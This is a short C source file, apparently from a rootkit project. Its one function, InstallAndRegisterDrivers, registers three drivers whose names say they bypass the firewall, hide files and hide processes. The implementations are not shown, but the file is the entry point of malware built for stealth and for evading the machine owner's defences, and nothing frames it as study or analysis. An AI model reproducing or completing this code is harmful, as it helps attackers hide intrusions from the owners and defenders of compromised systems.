#include "firewall.h"
#include "file.h"
#include "process.h"

void InstallAndRegisterDrivers(void){
	RegisterFrwBypassingDriver();
	RegisterFileHidingDriver();
	RegisterProcessHidingDriver();
}